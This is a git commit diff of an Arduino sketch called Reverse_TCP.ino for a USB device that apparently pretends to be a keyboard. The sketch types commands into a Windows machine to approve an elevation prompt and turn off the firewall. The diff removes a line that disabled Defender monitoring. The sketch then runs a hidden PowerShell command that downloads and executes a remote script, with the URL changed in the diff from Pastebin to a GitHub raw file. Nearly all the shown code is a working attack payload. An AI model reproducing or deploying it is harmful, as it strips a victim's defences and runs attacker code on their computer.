364a5f69bd18c4a216fad2ae47f1e243b5db06f8
Choudhary Abdullah <magnetonx@gmail.com>
2020-01-31 21:19:40 +0530

    Add files via upload

--- Reverse_TCP.ino
+++ Reverse_TCP.ino
@@ -11,9 +11,9 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
   DigiKeyboard.delay(500);
-  DigiKeyboard.println("Set-MpPreference -DisableRealtimeMonitoring $true"); 
+  DigiKeyboard.println("Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"); 
   DigiKeyboard.delay(200);
-  DigiKeyboard.println("powershell -windowstyle hidden -nop \"IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/KyWVEpky');\"");
+  DigiKeyboard.println("powershell -windowstyle hidden -nop \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cyber-stark/Attiny85/master/Windows.ps1');\"");
   DigiKeyboard.delay(200);
   DigiKeyboard.println("exit");
   for(;;){ }
